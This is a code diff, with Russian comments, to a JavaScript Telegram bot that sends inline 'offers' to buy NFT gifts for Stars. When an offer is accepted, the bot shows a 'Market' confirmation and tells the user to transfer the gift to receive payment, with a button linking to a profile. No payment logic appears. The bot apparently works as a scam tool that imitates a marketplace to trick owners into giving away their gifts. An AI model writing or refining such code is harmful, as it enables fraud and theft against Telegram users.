@@ -30,7 +30,6 @@ export default {
         if (!isAdmin && !isAllowed) {
           text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
         } else {
-          // ТУТ ОБНОВЛЕННЫЙ ТЕКСТ С ТВОИМ ПРИМЕРОМ
           text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
         }
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
@@ -49,15 +48,12 @@ export default {
 
         const textQuery = iq.query.trim();
         
-        // Ищем все числа и берем последнее (это сумма)
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
-        // Ищем название подарка
         const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
         const giftId = giftMatch ? giftMatch[0] : "";
         
-        // Формируем правильную ссылку для красивой картинки
         let giftLink = "";
         if (giftId) {
             if (giftId.startsWith("t.me")) {
@@ -94,59 +90,68 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
-        // 1. СНАЧАЛА МГНОВЕННО ОТВЕЧАЕМ TELEGRAM (убираем загрузку)
-        try {
-          if (cq.data.startsWith("acc")) {
-            await callApi("answerCallbackQuery", { 
-              callback_query_id: cq.id, 
-              text: `Market\nПредложение на продажу успешно принято.`, 
-              show_alert: true 
-            });
-          } else if (cq.data.startsWith("dec")) {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-          } else {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-          }
-        } catch (e) {
-          console.error("Ошибка при ответе на кнопку:", e);
+        // Получаем данные того, кто НАЖАЛ на кнопку (покупателя)
+        const buyer = cq.from;
+        let buyerName = buyer.first_name || "";
+        if (buyer.last_name) buyerName += " " + buyer.last_name;
+        if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
+
+        // Формируем ссылку на профиль покупателя
+        let buyerLink = "";
+        if (buyer.username) {
+          buyerLink = "https://t.me/" + buyer.username;
+        } else {
+          buyerLink = `tg://user?id=${buyer.id}`;
         }
 
-        // 2. ТЕПЕРЬ МЕНЯЕМ СООБЩЕНИЕ
+        // 1. МГНОВЕННО ОТВЕЧАЕМ (убираем загрузку)
+        if (cq.data.startsWith("acc")) {
+          await callApi("answerCallbackQuery", { 
+            callback_query_id: cq.id, 
+            text: `Market\nПредложение на продажу успешно принято.`, 
+            show_alert: true 
+          });
+        } else if (cq.data.startsWith("dec")) {
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+        }
+
+        // 2. МЕНЯЕМ СООБЩЕНИЕ
+        if (!cq.message) return new Response("OK", { status: 200 }); 
+        
+        const chatId = cq.message.chat.id;
+        const messageId = cq.message.message_id;
+        const hasCaption = !!cq.message.caption;
+        const messageText = cq.message.text || cq.message.caption || "";
+
+        const amountMatch = messageText.match(/(\d+)\s*⭐/);
+        const amount = amountMatch ? amountMatch[1] : "указанную сумму";
+
+        let newText = "";
+        let newMarkup = { inline_keyboard: [] };
+
+        if (cq.data.startsWith("acc")) {
+          // Используем имя покупателя вместо "MarketRedo"
+          newText = `✓ <b>${buyerName}</b> принял оффер!\n\nПодарок продан!\nПередайте подарок для зачисления ${amount} ⭐ Stars`;
+          newMarkup = { 
+            // Кнопка ведет на профиль покупателя
+            inline_keyboard: [[{ text: "Передать NFT ↗", url: buyerLink }]] 
+          };
+        } else if (cq.data.startsWith("dec")) {
+          // Используем имя покупателя вместо "MarketRedo"
+          newText = `× <b>${buyerName}</b> отклонил оффер`;
+        }
+
         try {
-          if (!cq.message) return new Response("OK", { status: 200 });
-          
-          const chatId = cq.message.chat.id;
-          const messageId = cq.message.message_id;
-          const hasCaption = !!cq.message.caption;
-          const messageText = cq.message.text || cq.message.caption || "";
-
-          const amountMatch = messageText.match(/(\d+)\s*⭐/);
-          const amount = amountMatch ? amountMatch[1] : "указанную сумму";
-
-          if (cq.data.startsWith("acc")) {
-            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
-            const newMarkup = { 
-              inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
-            };
-
-            if (hasCaption) {
-              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
-            } else {
-              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
-            }
-          } 
-          else if (cq.data.startsWith("dec")) {
-            const newText = `× Оффер отклонён.`;
-            const emptyMarkup = { inline_keyboard: [] };
-
-            if (hasCaption) {
-              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
-            } else {
-              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
-            }
+          if (hasCaption) {
+            await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
+          } else {
+            await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
           }
         } catch (e) {
-          console.error("Ошибка при изменении сообщения:", e);
+          console.error("Ошибка при изменении:", e.message);
+          if (!e.message.includes("message is not modified")) {
+             await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Ошибка: " + e.message, show_alert: true });
+          }
         }
       }
 
@@ -166,9 +171,13 @@ async function callApi(method, body) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(body)
     });
-    return await response.json();
+    const data = await response.json();
+    if (!data.ok) {
+      throw new Error(data.description);
+    }
+    return data;
   } catch (e) {
-    console.error("Ошибка Fetch:", e.message);
+    console.error(`Ошибка API [${method}]:`, e.message);
     throw e;
   }
 }
